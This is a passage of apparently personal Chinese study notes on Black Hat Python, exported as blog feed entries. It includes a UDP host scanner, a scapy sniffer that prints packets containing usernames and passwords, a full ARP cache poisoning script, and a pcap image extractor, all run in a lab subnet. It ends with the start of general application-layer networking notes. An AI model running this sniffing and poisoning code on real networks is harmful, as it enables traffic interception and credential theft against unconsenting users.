class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\n\nSummary: Hosts up op <span class="subst">&#123;SUBNET&#125;</span>&#x27;</span>)  </span><br><span class="line">            <span class="keyword">for</span> host <span class="keyword">in</span> <span class="built_in">sorted</span>(hosts_up):  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>&#x27;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">            sys.exit()  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_sender</span>():</span>  </span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM) <span class="keyword">as</span> sender:  </span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> ipaddress.ip_network(SUBNET).hosts():  </span><br><span class="line">            sender.sendto(<span class="built_in">bytes</span>(MESSAGE, <span class="string">&#x27;utf-8&#x27;</span>), (<span class="built_in">str</span>(ip), <span class="number">65212</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:  </span><br><span class="line">        host = sys.argv[<span class="number">1</span>]  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        host = <span class="string">&#x27;10.0.2.4&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">    s = Scanner(host)  </span><br><span class="line">    time.sleep(<span class="number">5</span>)  </span><br><span class="line">    t = threading.Thread(target=udp_sender)  </span><br><span class="line">    t.start()  </span><br><span class="line">    s.sniff()</span><br></pre></td></tr></table></figure>
<p>想先重点说明一下
<code>if raw_buffer[len(raw_buffer) - len(MESSAGE): ] == bytes(MESSAGE, 'utf-8')</code>。我们发送的UDP分组是带有MESSAGE数据的，因此如果收到ICMP分组，那么ICMP分组中的
<strong>最后</strong>
就是发送的数据，即MESSAGE。因此，我们对收到的分组需要做以下验证工作：</p>
<ol type="1">
<li>是否为ICMP？</li>
<li>ICMP分组中是否满足 <code>Type=3, Code=3</code>？</li>
<li>发来ICMP分组的主机是否在子网内？</li>
<li>这个ICMP分组是否带有数据MESSAGE？带有数据说明是对之前发的UDP的响应，不带有数据则说明不是UDP的响应，我们需要丢弃</li>
</ol>
<p>上述代码的工作流程：</p>
<ol type="1">
<li>先执行 <code>upd_sender()</code>
函数，向host所在子网广播udp，目标端口为 65212（随便选一个）</li>
<li>然后执行 <code>s.sniff()</code> 方法：
<ol type="1">
<li>捕捉到来的分组，提取IP头部</li>
<li>做上述4个验证工作</li>
<li>验证通过则将发来ICMP分组的host加入 <code>host_up</code> 列表中</li>
</ol></li>
</ol>
<p>运行结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220615211142.png" /></p>
]]></content>
      <categories>
        <category>python</category>
        <category>black_hat_python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>black_hat_python</tag>
      </tags>
  </entry>
  <entry>
    <title>第 3 章 scapy：网络的掌控者</title>
    <url>/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="窃取-email-认证">1. 窃取 Email 认证</h1>
<p>首先，我们在前一章中做了许多工作，实现了网络的嗅探功能，但是很多工作都是从头开始，比如创建socket，从缓冲接收数据，对数据进行解析等工作，本章介绍的模块
<code>scapy</code> 将会非常简单的实现上嗅探的工作。</p>
<p><code>scapy</code> 安装方式：<code>pip3 install scapy</code> 即可</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617154433.png" /></p>
<p>然后介绍内置的一个函数 sniff： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sniff(<span class="built_in">filter</span>=<span class="string">&#x27;&#x27;</span>, iface=<span class="string">&#x27;any&#x27;</span>, prn=function, count=N)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>filter：允许我们对scapy嗅探的数据包指定一个BPF(Berkeley Packet
Filter)过滤器。比如说，我们可以将BPF过滤器设置为
<code>tcp port 80</code> ，这样就只嗅探 HTTP
分组。当然，也可以将该参数留空以嗅探所有分组</li>
<li>iface：设置嗅探的网卡，如果留空，则对所有网卡进行嗅探</li>
<li>prn：指定一个回调函数，当嗅探到符合BPF过滤器的分组时，需要调用该回调函数，<strong>这个回调函数以接收到的数据包对象作为唯一的参数</strong>。</li>
<li>count：指定需要嗅探的分组个数。留空则scapy嗅探无限个分组</li>
</ul>
<p>编写一个简单的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span>(<span class="params">packet</span>):</span>  </span><br><span class="line">    <span class="built_in">print</span>(packet.show())</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    sniff(prn=packet_callback)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>然后运行该代码（以root权限），等待收到的数据（可以打开一个网页，就会收到响应），然后该程序的作用会将分组信息显示出来(<code>packet.show()</code>)</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617155430.png" /></p>
<p>解析来，将上述的代码进行修改，我们只需要嗅探跟Email有关的分组，并且获得里面的信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> TCP, IP  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">packet_callback</span>(<span class="params">packet</span>):</span>  </span><br><span class="line">    <span class="keyword">if</span> packet[TCP].payload:  </span><br><span class="line">        mypacket = <span class="built_in">str</span>(packet[TCP].payload)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> mypacket.lower() <span class="keyword">or</span> <span class="string">&#x27;pass&#x27;</span> <span class="keyword">in</span> mypacket.lower():  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Destination: <span class="subst">&#123;packet[IP].dst&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;<span class="built_in">str</span>(packet[TCP].payload)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    <span class="comment"># 110 POP3, 143 IMAP, 25 SMTP  </span></span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&#x27;tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80&#x27;</span>, prn=packet_callback, store=<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>这里的 filter 涉及到 BRF syntax（也叫做 Wireshark
style），这里的意思是：只需要tcp协议，并且端口为110，25，143的分组，这三个端口是Email相关的协议使用的端口。然后打印出目标IP和用户名密码。</p>
<p>但是现在基本没有明文传输的，除非自己搭建服务，因此这里添加一个80端口看一下效果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617221053.png" /></p>
<p>因为HTTP协议中有一个 User-Agent 所以能够满足条件从而打印 payload</p>
<p>书中的结果如下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220617222600.png" /></p>
<h1 id="arp-缓存投毒">2. ARP 缓存投毒</h1>
<p>原理其实就是两边骗：</p>
<ol type="1">
<li>欺骗目标主机，使其相信我们的攻击主机就是它的网关</li>
<li>欺骗网关，使其相信我们就是目标主机</li>
</ol>
<blockquote>
<p>ARP缓存投毒只针对 IPv4</p>
</blockquote>
<p>需要具备1个条件：</p>
<ul>
<li>攻击主机和目标主机处于同一个网络，也就是网关相同</li>
<li>知道目标 IP 和网关 IP</li>
</ul>
<p>过程：</p>
<ol type="1">
<li>根据目标 IP 和网关 IP 分别获得目标主机的 MAC 地址和网关的 MAC
地址。<code>get_mac</code> 函数中实现</li>
<li>不停的分别给目标主机发送 ARP 响应分组（op=2），给网关发送 ARP
响应分组（op=2）。<code>Arper.poison()</code> 方法中实现</li>
<li>不停的监听网卡，当收到 IP
地址为目标主机的分组（可能是网关发的，也可能是目标主机发的），说明目标主机/网关的
ARP 缓存表已被更新，投毒成功，并将包的内容写入到 arper.pcap。
<code>Arper.sniff()</code> 方法中实现</li>
<li>成功接收 100 个分组之后停止投毒。发送正确的 ARP 响应分组来恢复 ARP
缓存表。<code>Arper.restore()</code> 方法中实现</li>
</ol>
<p>代码如下：</p>
<ul>
<li>攻击主机 IP：10.0.2.4</li>
<li>目标主机 IP：10.0.2.21</li>
<li>网关 IP：10.0.2.1</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process  </span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> os, sys, time  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Arper</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, victim, gateway, interface=<span class="string">&#x27;eth0&#x27;</span></span>):</span>  </span><br><span class="line">        self.victim = victim  </span><br><span class="line">        self.victimmac = get_mac(victim)  </span><br><span class="line">        self.gateway = gateway  </span><br><span class="line">        self.gatewaymac =get_mac(gateway)  </span><br><span class="line">        self.interface = interface  </span><br><span class="line">        conf.iface = interface  </span><br><span class="line">        conf.verb = <span class="number">0</span>  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Initialized <span class="subst">&#123;interface&#125;</span>: &#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Gateway (<span class="subst">&#123;gateway&#125;</span>) is at <span class="subst">&#123;self.gatewaymac&#125;</span>.&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Victim (<span class="subst">&#123;victim&#125;</span>) is at <span class="subst">&#123;self.victimmac&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">30</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        self.poison_thread = Process(target=self.poison)  </span><br><span class="line">        self.poison_thread.start()  </span><br><span class="line">  </span><br><span class="line">        self.sniff_thread = Process(target=self.sniff)  </span><br><span class="line">        self.sniff_thread.start()  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">poison</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        <span class="comment"># poison_victim: 欺骗 victim，假装为网关给 victim 发送  </span></span><br><span class="line">        poison_victim = ARP()  </span><br><span class="line">        poison_victim.op = <span class="number">2</span>  </span><br><span class="line">        poison_victim.psrc = self.gateway  </span><br><span class="line">        poison_victim.pdst = self.victim  </span><br><span class="line">        poison_victim.hwdst = self.victimmac  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip src: <span class="subst">&#123;poison_victim.psrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip dst: <span class="subst">&#123;poison_victim.pdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac src: <span class="subst">&#123;poison_victim.hwsrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac dst: <span class="subst">&#123;poison_victim.hwdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(poison_victim.summary())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">30</span>)  </span><br><span class="line">        <span class="comment"># poison_gateway: 欺骗 gateway，假装为 victim 给网关发送  </span></span><br><span class="line">        poison_gateway = ARP()  </span><br><span class="line">        poison_gateway.op = <span class="number">2</span>  </span><br><span class="line">        poison_gateway.psrc = self.victim  </span><br><span class="line">        poison_gateway.pdst = self.gateway  </span><br><span class="line">        poison_gateway.hwdst = self.gatewaymac  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip src: <span class="subst">&#123;poison_gateway.psrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;ip dst: <span class="subst">&#123;poison_gateway.pdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac src: <span class="subst">&#123;poison_gateway.hwsrc&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;mac dst: <span class="subst">&#123;poison_gateway.hwdst&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(poison_gateway.summary())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">30</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Beginning the ARP poison. [CTRL-C to stop]&#x27;</span>)  </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;.&#x27;</span>)  <span class="comment"># 往stdout缓冲区中写入 .</span></span><br><span class="line">            sys.stdout.flush()  <span class="comment"># stdout缓冲区不会一有内容就输出，该函数的作用就是显示的触发 stdout 输出缓冲区的内容</span></span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                send(poison_victim)  </span><br><span class="line">                send(poison_gateway)  </span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:  </span><br><span class="line">                self.restore()  </span><br><span class="line">                sys.exit()  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                time.sleep(<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sniff</span>(<span class="params">self, count=<span class="number">100</span></span>):</span>  </span><br><span class="line">        time.sleep(<span class="number">5</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Sniffing <span class="subst">&#123;count&#125;</span> packet&#x27;</span>)  </span><br><span class="line">        bpf_filter = <span class="string">&#x27;ip host %s&#x27;</span> % self.victim  </span><br><span class="line">        packets = sniff(count=count, <span class="built_in">filter</span> = bpf_filter, iface=self.interface)  </span><br><span class="line">        wrpcap(<span class="string">&#x27;arper.pcap&#x27;</span>, packets)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Got the packets&#x27;</span>)  </span><br><span class="line">        self.restore()  </span><br><span class="line">        self.poison_thread.terminate()  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Finished.&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restore</span>(<span class="params">self</span>):</span>  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Restoring ARP tables...&#x27;</span>)  </span><br><span class="line">        send(ARP(  </span><br><span class="line">            op = <span class="number">2</span>,  </span><br><span class="line">            psrc = self.gateway,  </span><br><span class="line">            pdst = self.victim,  </span><br><span class="line">            hwsrc = self.gatewaymac,  </span><br><span class="line">            hwdst = <span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>),  </span><br><span class="line">            count = <span class="number">5</span>)  </span><br><span class="line">  </span><br><span class="line">        send(ARP(  </span><br><span class="line">            op = <span class="number">2</span>,  </span><br><span class="line">            psrc = self.victim,  </span><br><span class="line">            pdst = self.gateway,  </span><br><span class="line">            hwsrc = self.victimmac,  </span><br><span class="line">            hwdst = <span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>),  </span><br><span class="line">            count = <span class="number">5</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span>(<span class="params">target_ip</span>):</span>  </span><br><span class="line">    <span class="comment"># Ether: 广播， ARP：请求MAC地址  </span></span><br><span class="line">    packet = Ether(dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>)/ARP(op=<span class="string">&quot;who-has&quot;</span>, pdst=target_ip)  </span><br><span class="line">    resp, _ = srp(packet, timeout=<span class="number">2</span>, retry=<span class="number">10</span>, verbose=<span class="literal">False</span>)  </span><br><span class="line">    <span class="keyword">for</span> _, r <span class="keyword">in</span> resp:  </span><br><span class="line">        <span class="keyword">return</span> r[Ether].src  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    (victim, gateway, interface) = (sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])  </span><br><span class="line">    myarp = Arper(victim, gateway, interface)  </span><br><span class="line">    myarp.run()</span><br></pre></td></tr></table></figure>
<p>在运行之前，我们首先要打开攻击主机的转发功能，当我们收到目标主机来的分组的时候要将其转发出去（给网关），从网关收到发给目标主机的分组也需要进行转发</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward # 需要在 root 用户下执行</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211703.png" /></p>
<p>（等待了许久才用目标主机访问网站，这是因为 arp
缓存表是有时间限制的，投毒时间久一点能够保证目标主机和网关都被投毒。如果只有一方就很尴尬了）</p>
<p>看一下目标主机此时的 arp 缓存表：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618211837.png" /></p>
<p>可以看到 10.0.2.1（网关）和
10.0.2.4（攻击主机）的MAC地址一样，都是攻击主机的MAC地址，说明对目标主机投毒成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212028.png" /></p>
<p>看一下 arper.pcap 文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220618212248.png" /></p>
<p>可以看到，攻击主机成功当上了目标主机和网关之间的“代理”。</p>
<h1 id="处理-pcap-文件">3. 处理 PCAP 文件</h1>
<p>接下来处理刚刚获得的 pcap 文件，我们要求从中找到 HTTP
报文，并从中取出图片。代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, re, sys, zlib, collections</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">OUTDIR = os.path.join(pwd, <span class="string">&#x27;picture&#x27;</span>)</span><br><span class="line">Response = collections.namedtuple(<span class="string">&#x27;Response&#x27;</span>, [<span class="string">&#x27;header&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Recapper</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, fname</span>):</span></span><br><span class="line">        pcap = rdpcap(fname) <span class="comment"># 读取 pcap 文件的内容</span></span><br><span class="line">        self.sessions = pcap.sessions() <span class="comment"># 剥离每个 TCP 会话</span></span><br><span class="line">        self.responses = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_responses</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> session <span class="keyword">in</span> self.sessions:</span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> packet <span class="keyword">in</span> self.sessions[session]: <span class="comment"># 读取每个会话的所有分组</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet[TCP].dport == <span class="number">80</span> <span class="keyword">or</span> packet[TCP].sport == <span class="number">80</span>:</span><br><span class="line">                        payload += <span class="built_in">bytes</span>(packet[TCP].payload)</span><br><span class="line">                <span class="keyword">except</span> IndexError:</span><br><span class="line">                    sys.stdout.write(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                header = get_header(payload)</span><br><span class="line">                <span class="keyword">if</span> header <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                self.responses.append(Response(header=header, payload=payload))</span><br><span class="line">                </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">self, content_name</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i, response <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.responses):</span><br><span class="line">            content, content_type = extract_content(response, content_name)</span><br><span class="line">            <span class="keyword">if</span> content <span class="keyword">and</span> content_type:</span><br><span class="line">                fname = os.path.join(OUTDIR, <span class="string">f&#x27;ex_<span class="subst">&#123;i&#125;</span>.<span class="subst">&#123;content_type&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Writing <span class="subst">&#123;fname&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_header</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header_raw = payload[:payload.index(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        sys.stdout.write(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    header = <span class="built_in">dict</span>(re.findall(<span class="string">r&#x27;(.*?): (.*?)\r\n&#x27;</span>, header_raw.decode()))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> header:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_content</span>(<span class="params">response, content_name=<span class="string">&#x27;image&#x27;</span></span>):</span></span><br><span class="line">    <span class="comment"># Content-Type: image/jpeg\r\n 下面的注释以这个为栗子</span></span><br><span class="line">    content, content_type = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> content_name <span class="keyword">in</span> response.header[<span class="string">&#x27;Content-Type&#x27;</span>]:</span><br><span class="line">        content_type = response.header[<span class="string">&#x27;Content-Type&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>] <span class="comment"># 获得图片的后缀 jpeg</span></span><br><span class="line">        content = response.payload[response.payload.index(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)+<span class="number">4</span>: ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Encoding&#x27;</span> <span class="keyword">in</span> response.header:</span><br><span class="line">            <span class="keyword">if</span> response.header[<span class="string">&#x27;Content-Encoding&#x27;</span>] == <span class="string">&#x27;gzip&#x27;</span>:</span><br><span class="line">                content = zlib.decompress(response.payload, zlib.MAX_WBITS | <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">elif</span> response.header[<span class="string">&#x27;Content-Encoding&#x27;</span>] == <span class="string">&#x27;deflate&#x27;</span>:</span><br><span class="line">                content = zlib.decompress(response.payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content, content_type</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pfile = os.path.join(pwd, <span class="string">&#x27;arper.pcap&#x27;</span>)</span><br><span class="line">    recapper = Recapper(pfile)</span><br><span class="line">    recapper.get_responses()</span><br><span class="line">    recapper.write(<span class="string">&#x27;image&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>get_header</code> 函数：取得 payload 的头部</li>
<li><code>extract_content</code> 函数：取出类型为 image
的分组的后缀名和数据，如果数据部分存在压缩，那么就进行解压缩</li>
<li><code>__init__</code> 方法：将每个 TCP 会话单独取出，并创建一个存放
self.response 的列表</li>
<li><code>get_responses</code> 方法：从每个 TCP 会话中过滤掉端口不是 80
的分组，然后将整个 TCP 会话中带有 TCP 头部的分组整合为一个
payload，并加入到 self.response 列表</li>
<li><code>write</code> 方法：将 self.response 中的 每一个 payload
的数据部分写到一个文件里</li>
</ul>
<p>运行结果并不是很理想：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220721.png" /></p>
<p>保存下来的图片大部分都是这样的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220806.png" /></p>
<p>这有多个原因：</p>
<ol type="1">
<li><p>一个 TCP 会话不止存在一个 HTTP
分组，这些分组有的不是图片的分组，有的是，而上述代码中不管三七二十一，将一个
TCP 会话中的所有 HTTP 分组合并</p></li>
<li><p>在 <code>extract_content</code> 中只是读取了
<code>response.payload[response.payload.index(b'\r\n\r\n')+4: ]</code>
内容，如果只有一个 HTTP 分组的话，这确实是数据部分，但是 payload
中有多个分组，因此这就会将其他分组的头部也一并读取，而这些头部无法被识别为图片</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619221205.png" /></p></li>
<li><p>一张图片太大了，被拆成多个分组，不同分组的到来顺序不同，导致即使将数据部分正确拿到，也无法得到正确的图片。比如，我尝试将上图中的文件拆成多个文件，得到多张图片，其中一张图片如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619223422.png" /></p></li>
</ol>
<p>书中还介绍了人脸识别，这属于机器学习的类别了，这里不做介绍。</p>
]]></content>
      <categories>
        <category>python</category>
        <category>black_hat_python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>black_hat_python</tag>
      </tags>
  </entry>
  <entry>
    <title>第 2 章 应用层</title>
    <url>/2022/06/02/%E7%AC%AC%202%20%E7%AB%A0%20%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="应用层协议原理">1. 应用层协议原理</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530214613.png" /></p>
<p>如果我们要创建一个新的网络应用，需要注意<strong>网络核心中没有应用层软件</strong>，从上一章的图中也可以看出，路由器只有物理层、链路层、网络层，因此，也注定了网络核心设备不在应用层上起作用，而仅在低层起作用。</p>
<p>这种设计方式将应用软件限制在了端系统，促进了网络应用程序的研发和部署。因为只需要遵从协议，就可以立马部署网络应用程序。</p>
<h2 id="网络应用的体系结构">1.1. 网络应用的体系结构</h2>
<p>网络应用的体系结构大致分为是2种类型：</p>
<ol type="1">
<li>客户-服务器模式(C/S: client/server)</li>
<li>对等模式(p2p: peer to peer)</li>
</ol>
<h3 id="cs模式">1.1.1. C/S模式</h3>
<p>在该体系结构性，将端系统分为两种：服务器和客户端。</p>
<p>服务器：</p>
<ul>
<li><strong>一直运行</strong>：保证任何时刻，客户端请求都能给予响应；</li>
<li><strong>固定的IP地址和周知的端口号</strong>：保证客户端能够请求到该服务器的资源；</li>
<li><strong>扩展性较差</strong></li>
</ul>
<p>客户端：</p>
<ul>
<li><strong>主动与服务器通信</strong></li>
<li><strong>与互联网间歇性连接</strong></li>
<li><strong>可能是动态IP地址</strong></li>
<li><strong>不直接与其他客户端通信</strong></li>
</ul>
<p>服务器不只一台主机，可能是一个<strong>数据中心（有许多主机）</strong>，数据中心也可能不止一个。这样子全球各地的用户可以选择距离自己最近的数据中心请求资源。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220530215738.png" /></p>
<p>这种模式的好处就是可以随时向服务器请求资源，但是这种模式下存在“不平等关系”，服务器有着所有的数据，而客户端没有，并且一旦客户端数量太多，服务器服务不过来，导致每个客户端的速率降低，更有甚者，还会导致服务器宕机。</p>
<p>该模式好就好在稳定，可管理性强。</p>
<h3 id="p2p模式">1.1.2. p2p模式</h3>
<ul>
<li>没有一直运行的服务器；</li>
<li>任意端系统之间可以通信；</li>
<li>每个节点既是客户端，也是服务器；</li>
